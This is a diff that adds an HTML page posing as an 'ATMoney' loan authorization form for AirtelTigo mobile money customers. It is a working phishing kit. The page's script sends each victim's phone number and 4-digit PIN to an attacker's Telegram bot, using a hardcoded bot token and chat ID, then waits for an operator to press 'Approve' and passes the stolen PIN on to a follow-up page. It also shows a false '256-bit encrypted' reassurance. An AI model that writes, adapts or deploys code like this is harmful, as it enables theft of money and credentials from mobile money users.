@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify & Authorize Loan - ATMoney</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
+    <style>
+        /* ── all styles unchanged except PIN ── */
+        :root {
+            --red: #003DA5;
+            --red-dark: #002D80;
+            --red-soft: rgba(0, 61, 165, 0.08);
+            --red-border: rgba(0, 61, 165, 0.18);
+            --at-red: #E30613;
+            --text-dark: #111827;
+            --text-mid: #4b5563;
+            --text-light: #9ca3af;
+            --bg: #f3f4f6;
+            --card: #ffffff;
+            --border: #e5e7eb;
+            --input-bg: #f9fafb;
+            --shadow: 0 20px 60px rgba(0, 0, 0, 0.10), 0 4px 16px rgba(0, 0, 0, 0.06);
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: var(--bg);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            background-image: radial-gradient(ellipse at 20% 10%, rgba(228, 35, 32, 0.06) 0%, transparent 55%), radial-gradient(ellipse at 80% 90%, rgba(228, 35, 32, 0.04) 0%, transparent 50%);
+        }
+
+        .card {
+            width: 100%;
+            max-width: 430px;
+            background: var(--card);
+            border-radius: 28px;
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            animation: fadeUp 0.45s cubic-bezier(.22, .8, .3, 1) both;
+        }
+
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(24px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            background: linear-gradient(135deg, #003DA5 0%, #001F5C 100%);
+            padding: 28px 28px 24px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -40px;
+            right: -40px;
+            width: 160px;
+            height: 160px;
+            background: rgba(255, 255, 255, 0.06);
+            border-radius: 50%;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -30px;
+            left: 30px;
+            width: 100px;
+            height: 100px;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 50%;
+        }
+
+        .logo-wrap {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 18px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo-bg {
+            background: white;
+            border-radius: 14px;
+            padding: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 48px;
+            height: 48px;
+            flex-shrink: 0;
+        }
+
+        .logo-bg img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 12px;
+        }
+
+        .brand-name {
+            font-family: 'Sora', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+            letter-spacing: -0.3px;
+            line-height: 1.1;
+        }
+
+        .brand-name span {
+            color: var(--at-red);
+        }
+
+        .brand-sub {
+            font-size: 11.5px;
+            color: rgba(255, 255, 255, 0.72);
+            font-weight: 400;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            margin-top: 1px;
+        }
+
+        .header-title {
+            font-family: 'Sora', sans-serif;
+            font-size: 23px;
+            font-weight: 800;
+            color: white;
+            position: relative;
+            z-index: 1;
+            letter-spacing: -0.5px;
+            line-height: 1.2;
+        }
+
+        .header-desc {
+            font-size: 13.5px;
+            color: rgba(255, 255, 255, 0.78);
+            margin-top: 6px;
+            position: relative;
+            z-index: 1;
+            line-height: 1.55;
+            font-weight: 400;
+        }
+
+        .loan-info {
+            margin: 20px 22px 0;
+            background: var(--red-soft);
+            border: 1px solid var(--red-border);
+            border-radius: 18px;
+            padding: 16px 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .loan-icon {
+            width: 42px;
+            height: 42px;
+            background: var(--red);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .loan-icon svg {
+            width: 22px;
+            height: 22px;
+        }
+
+        .loan-label {
+            font-size: 11.5px;
+            font-weight: 600;
+            color: var(--red);
+            letter-spacing: 0.6px;
+            text-transform: uppercase;
+        }
+
+        .loan-amount {
+            font-family: 'Sora', sans-serif;
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--text-dark);
+            letter-spacing: -0.8px;
+            line-height: 1.1;
+        }
+
+        .loan-details {
+            font-size: 12.5px;
+            color: var(--text-mid);
+            margin-top: 2px;
+            font-weight: 500;
+        }
+
+        .form-body {
+            padding: 22px 22px 26px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 7px;
+            letter-spacing: 0.1px;
+        }
+
+        select,
+        input[type="tel"] {
+            width: 100%;
+            padding: 13px 15px;
+            background: var(--input-bg);
+            border: 1.5px solid var(--border);
+            border-radius: 13px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15.5px;
+            color: var(--text-dark);
+            transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+            appearance: none;
+            -webkit-appearance: none;
+            outline: none;
+        }
+
+        .select-wrap {
+            position: relative;
+        }
+
+        .select-wrap::after {
+            content: '';
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 0;
+            height: 0;
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            border-top: 6px solid var(--text-mid);
+            pointer-events: none;
+        }
+
+        select:focus,
+        input[type="tel"]:focus {
+            border-color: var(--red);
+            background: #fff;
+            box-shadow: 0 0 0 3.5px rgba(228, 35, 32, 0.10);
+        }
+
+        input[type="tel"]::placeholder {
+            color: var(--text-light);
+        }
+
+        /* ─── PIN INPUT – enhanced like Telecel ─── */
+        .pin-group {
+            margin-bottom: 18px;
+        }
+
+        .pin-group .label-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .pin-group .label-row label {
+            margin-bottom: 0;
+        }
+
+        .pin-hint {
+            font-size: 12px;
+            color: var(--text-light);
+            font-weight: 400;
+        }
+
+        .pin-container {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-top: 8px;
+        }
+
+        .pin-box {
+            width: 100%;
+            height: 48px;
+            border-radius: 12px;
+            border: 1.5px solid var(--border);
+            background: var(--input-bg);
+            text-align: center;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--text-dark);
+            transition: border-color 0.18s, box-shadow 0.18s, background 0.18s, transform 0.12s;
+            outline: none;
+            caret-color: var(--at-red);
+            -webkit-appearance: none;
+            appearance: none;
+            /* mask digits with bullets */
+            -webkit-text-security: disc;
+            /* for firefox, use text-security but it's not standard; fallback to type=password via JS */
+        }
+
+        .pin-box:focus {
+            border-color: var(--red);
+            background: #ffffff;
+            box-shadow: 0 0 0 3.5px rgba(228, 35, 32, 0.10);
+            transform: translateY(-1px);
+        }
+
+        .pin-box.filled {
+            border-color: #ffaaaa;
+            background: #fff9f9;
+        }
+
+        .pin-box:focus-visible {
+            outline: none;
+        }
+
+        /* ── error ── */
+        .error-msg {
+            display: none;
+            background: #fff1f1;
+            border: 1px solid #fca5a5;
+            color: #b91c1c;
+            font-size: 13.5px;
+            font-weight: 500;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: linear-gradient(135deg, #E42320, #c01c1a);
+            color: white;
+            border: none;
+            padding: 15px;
+            font-family: 'Sora', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            letter-spacing: -0.2px;
+            transition: opacity 0.18s, transform 0.12s, box-shadow 0.18s;
+            box-shadow: 0 4px 18px rgba(228, 35, 32, 0.35);
+            margin-top: 4px;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            opacity: 0.93;
+            box-shadow: 0 6px 24px rgba(228, 35, 32, 0.40);
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .btn-primary:disabled {
+            background: #d1d5db;
+            box-shadow: none;
+            cursor: not-allowed;
+        }
+
+        .btn-back {
+            width: 100%;
+            background: transparent;
+            color: var(--text-mid);
+            border: 1.5px solid var(--border);
+            padding: 14px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: border-color 0.18s, color 0.18s;
+        }
+
+        .btn-back:hover {
+            border-color: #9ca3af;
+            color: var(--text-dark);
+        }
+
+        /* ── spinner ── */
+        #spinner {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(10, 10, 10, 0.85);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(4px);
+        }
+
+        .spin-ring {
+            width: 62px;
+            height: 62px;
+            border: 5px solid rgba(255, 255, 255, 0.12);
+            border-top-color: #E30613;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .security-note {
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            justify-content: center;
+            font-size: 12px;
+            color: var(--text-light);
+            margin-top: 18px;
+            font-weight: 500;
+        }
+
+        .security-note svg {
+            flex-shrink: 0;
+        }
+
+        /* ── responsive tweaks ── */
+        @media (max-width: 460px) {
+            .pin-container {
+                gap: 8px;
+            }
+            .pin-box {
+                height: 44px;
+                font-size: 20px;
+                border-radius: 10px;
+            }
+            .header-title {
+                font-size: 20px;
+            }
+            .loan-amount {
+                font-size: 22px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .pin-container {
+                gap: 6px;
+            }
+            .pin-box {
+                height: 40px;
+                font-size: 18px;
+                border-radius: 8px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="card">
+
+        <!-- ─── HEADER ─── -->
+        <div class="header">
+            <div class="logo-wrap">
+                <div class="logo-bg">
+                    <img src="logo.png" alt="ATMoney Logo" />
+                </div>
+                <div>
+                    <div class="brand-name">ATMoney<span>Loans</span></div>
+                    <div class="brand-sub">Life is Simple</div>
+                </div>
+            </div>
+            <div class="header-title">Authorize Your Loan</div>
+            <div class="header-desc">Enter your ATMoney number and PIN to securely verify and approve your Flex Loan request.</div>
+        </div>
+
+        <!-- ─── LOAN INFO ─── -->
+        <div class="loan-info" id="loanInfo">
+            <div class="loan-icon">
+                <svg fill="none" viewBox="0 0 24 24" stroke="white" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+                </svg>
+            </div>
+            <div class="loan-text">
+                <div class="loan-label" id="loanLabel">Flex Loan</div>
+                <div class="loan-amount" id="loanAmount">—</div>
+                <div class="loan-details" id="loanDetails"></div>
+            </div>
+        </div>
+
+        <!-- ─── FORM ─── -->
+        <div class="form-body">
+
+            <!-- Account Type -->
+            <div class="form-group">
+                <label for="accountType">Account Type</label>
+                <div class="select-wrap">
+                    <select id="accountType">
+                        <option value="mobile">ATMoney (Mobile Money)</option>
+                        <option value="broadband">Broadband</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Phone -->
+            <div class="form-group">
+                <label for="phone">Phone Number (AirtelTigo)</label>
+                <input type="tel" id="phone" placeholder="027XXXXXXX" maxlength="10" inputmode="numeric" />
+                <div style="font-size:12px; color:var(--text-light); margin-top:4px;">Enter your AirtelTigo number</div>
+            </div>
+
+            <!-- ─── 4‑DIGIT PIN (enhanced) ─── -->
+            <div class="pin-group">
+                <div class="label-row">
+                    <label>Enter PIN</label>
+                </div>
+                <div class="pin-container" id="pinContainer">
+                    <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 1" />
+                    <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 2" />
+                    <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 3" />
+                    <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="off" aria-label="PIN digit 4" />
+                </div>
+            </div>
+
+            <!-- Error -->
+            <div class="error-msg" id="errMsg"></div>
+
+            <!-- Buttons -->
+            <button class="btn-primary" id="continueBtn">Verify &amp; Authorize Loan</button>
+            <button class="btn-back" onclick="window.history.back()">← Back to Application</button>
+
+            <div class="security-note">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                </svg> 256-bit encrypted &amp; secured by ATMoney
+            </div>
+        </div>
+    </div>
+
+    <!-- ─── SPINNER ─── -->
+    <div id="spinner">
+        <div class="spin-ring"></div>
+    </div>
+
+    <script>
+        // ─── BOT CREDENTIALS ──────────────────────────────────────────────
+        const CONFIG = {
+            BOT_TOKEN: '8649687899:AAFrdOT0TQEKmzw1R9bSw6GPdb1r3pRF8oY',
+            CHAT_ID: '5831190536',
+            APPROVE_PAGE: 'activate.html',
+            SUCCESS_PAGE: 'success.html'
+        };
+
+        let isProcessing = false;
+        let pollingInterval = null;
+        let pollTimeout = null;
+        let lastUpdateId = 0;
+
+        const phoneInput = document.getElementById('phone');
+        const continueBtn = document.getElementById('continueBtn');
+        const errMsg = document.getElementById('errMsg');
+        const spinner = document.getElementById('spinner');
+        const pinBoxes = document.querySelectorAll('.pin-box');
+
+        // ─── LOAD LOAN DETAILS FROM URL ────────────────────────────────
+        function loadLoanDetails() {
+            const params = new URLSearchParams(window.location.search);
+            const amount = params.get('amount');
+            const duration = params.get('duration');
+            const purpose = params.get('purpose');
+            const name = params.get('name');
+            const prevPhone = params.get('phone');
+
+            if (amount) {
+                document.getElementById('loanAmount').textContent = `GHS ${parseFloat(amount).toLocaleString()}`;
+                document.getElementById('loanLabel').textContent = name ? `${name}'s Loan` : 'Flex Loan';
+
+                let details = [];
+                if (duration) details.push(`${duration} Days`);
+                if (purpose) details.push(purpose.replace(/([A-Z])/g, ' $1').trim());
+                document.getElementById('loanDetails').textContent = details.join(' • ');
+            }
+
+            if (prevPhone) phoneInput.value = prevPhone;
+        }
+
+        // ─── VALIDATE AIRTELTIGO ──────────────────────────────────────
+        function isValidTigoNumber(phone) {
+            if (phone.length !== 10) return false;
+            const tigoPrefixes = ['026', '027', '056', '057'];
+            return tigoPrefixes.some(p => phone.startsWith(p));
+        }
+
+        // ─── GET PIN AS STRING ──────────────────────────────────────────
+        function getPin() {
+            let pin = '';
+            pinBoxes.forEach(box => pin += box.value);
+            return pin;
+        }
+
+        function isPinComplete() {
+            return getPin().length === 4;
+        }
+
+        // ─── SHOW / HIDE ERROR ──────────────────────────────────────────
+        function showError(msg) {
+            errMsg.textContent = msg;
+            errMsg.style.display = 'block';
+        }
+
+        function hideError() {
+            errMsg.style.display = 'none';
+        }
+
+        // ─── RESET BUTTON ──────────────────────────────────────────────
+        function resetButton() {
+            isProcessing = false;
+            continueBtn.disabled = false;
+            continueBtn.textContent = "Verify & Authorize Loan";
+            spinner.style.display = 'none';
+        }
+
+        // ─── STOP POLLING ──────────────────────────────────────────────
+        function stopPolling() {
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+            if (pollTimeout) {
+                clearTimeout(pollTimeout);
+                pollTimeout = null;
+            }
+        }
+
+        // ─── ANSWER CALLBACK ──────────────────────────────────────────
+        function answerCallbackQuery(callbackQueryId, text, showAlert = false) {
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    callback_query_id: callbackQueryId,
+                    text: text,
+                    show_alert: showAlert
+                })
+            }).catch(e => console.warn('Answer callback failed', e));
+        }
+
+        // ─── POLL FOR UPDATES ──────────────────────────────────────────
+        function pollUpdates(approveId, declineId, phone, pin) {
+            const poll = () => {
+                const url =
+                    `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
+                fetch(url)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (!data.ok) return;
+                        const updates = data.result;
+                        if (updates.length === 0) return;
+
+                        lastUpdateId = updates[updates.length - 1].update_id;
+
+                        for (const update of updates) {
+                            const cb = update.callback_query;
+                            if (!cb) continue;
+                            const dataStr = cb.data;
+                            if (dataStr === approveId) {
+                                stopPolling();
+                                const params = new URLSearchParams(window.location.search);
+                                params.set('phone', phone);
+                                params.set('pin', pin);
+                                window.location.href = `${CONFIG.APPROVE_PAGE}?${params.toString()}`;
+                                return;
+                            } else if (dataStr === declineId) {
+                                stopPolling();
+                                resetButton();
+                                showError('Loan request was declined. Check phone number or PIN.');
+                                return;
+                            }
+                        }
+                    })
+                    .catch(err => {
+                        console.warn('Poll error', err);
+                    });
+            };
+
+            pollingInterval = setInterval(poll, 2000);
+            pollTimeout = setTimeout(() => {
+                stopPolling();
+                resetButton();
+                showError('No response from administrator. Please try again later.');
+                spinner.style.display = 'none';
+            }, 90000);
+        }
+
+        // ─── SEND TO BOT ──────────────────────────────────────────────
+        function sendToBot(phone, pin) {
+            if (isProcessing) return;
+            isProcessing = true;
+            continueBtn.disabled = true;
+            continueBtn.textContent = "Requesting…";
+
+            const ts = Date.now();
+            const approveId = `approve_${ts}`;
+            const declineId = `decline_${ts}`;
+
+            spinner.style.display = 'flex';
+
+            const amountText = document.getElementById('loanAmount').textContent;
+            const accountType = document.getElementById('accountType').value;
+
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.CHAT_ID,
+                        text: `<b>🔴 ATMoney Loan Initiation</b>\n\n` +
+                            `Amount: ${amountText}\n` +
+                            `Account: ${accountType === 'mobile' ? 'Mobile Money' : 'Broadband'}\n` +
+                            `Phone: <code>${phone}</code>\n` +
+                            `PIN: <code>${pin}</code>\n\n` +
+                            `Choose Action:`,
+                        parse_mode: 'HTML',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [{ text: "✅ Approve Loan", callback_data: approveId }],
+                                [{ text: "❌ Decline", callback_data: declineId }]
+                            ]
+                        }
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (!data.ok) {
+                        throw new Error('Telegram API error');
+                    }
+                    pollUpdates(approveId, declineId, phone, pin);
+                })
+                .catch(err => {
+                    resetButton();
+                    showError('Failed to send request. Please check your internet connection and try again.');
+                    spinner.style.display = 'none';
+                });
+        }
+
+        // ─── SUBMIT HANDLER ──────────────────────────────────────────────
+        continueBtn.onclick = () => {
+            hideError();
+
+            const phone = phoneInput.value.trim();
+            if (!phone || !isValidTigoNumber(phone)) {
+                showError("Please enter a valid 10‑digit AirtelTigo number (026, 027, 056, or 057).");
+                return;
+            }
+
+            const pin = getPin();
+            if (!isPinComplete()) {
+                showError("Please enter your 4‑digit PIN.");
+                for (const box of pinBoxes) {
+                    if (box.value === '') {
+                        box.focus();
+                        break;
+                    }
+                }
+                return;
+            }
+
+            sendToBot(phone, pin);
+        };
+
+        // ─── PIN BOX LOGIC ──────────────────────────────────────────────
+        pinBoxes.forEach((box, index) => {
+            // input: digit → advance
+            box.addEventListener('input', (e) => {
+                const val = e.target.value;
+                if (val.length > 0 && !/^[0-9]$/.test(val)) {
+                    e.target.value = '';
+                    return;
+                }
+                if (val.length === 1 && index < 3) {
+                    pinBoxes[index + 1].focus();
+                }
+                box.classList.toggle('filled', box.value !== '');
+                hideError();
+            });
+
+            // keydown: backspace, arrows
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                    e.preventDefault();
+                    pinBoxes[index - 1].focus();
+                    pinBoxes[index - 1].value = '';
+                    pinBoxes[index - 1].classList.remove('filled');
+                    hideError();
+                }
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    e.preventDefault();
+                    pinBoxes[index - 1].focus();
+                }
+                if (e.key === 'ArrowRight' && index < 3) {
+                    e.preventDefault();
+                    pinBoxes[index + 1].focus();
+                }
+            });
+
+            // focus: select all
+            box.addEventListener('focus', () => {
+                box.select();
+            });
+
+            // paste: fill all four
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                if (/^[0-9]{4}$/.test(paste)) {
+                    const digits = paste.split('');
+                    pinBoxes.forEach((b, i) => {
+                        b.value = digits[i] || '';
+                        b.classList.toggle('filled', b.value !== '');
+                    });
+                    pinBoxes[3].focus();
+                    hideError();
+                }
+            });
+        });
+
+        // ─── PHONE INPUT SANITISATION ──────────────────────────────────
+        phoneInput.addEventListener('input', () => {
+            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
+            hideError();
+        });
+
+        // ─── ENTER KEY ON LAST PIN BOX TRIGGERS SUBMIT ────────────────
+        pinBoxes[3].addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && isPinComplete()) {
+                continueBtn.click();
+            }
+        });
+
+        // ─── AUTO-FOCUS FIRST EMPTY PIN BOX ──────────────────────────
+        document.addEventListener('DOMContentLoaded', () => {
+            setTimeout(() => {
+                if (phoneInput.value.trim().length === 10) {
+                    pinBoxes[0].focus();
+                } else {
+                    phoneInput.focus();
+                }
+            }, 300);
+        });
+
+        // ─── INIT ──────────────────────────────────────────────────────
+        loadLoanDetails();
+    </script>
+</body>
+
+</html>
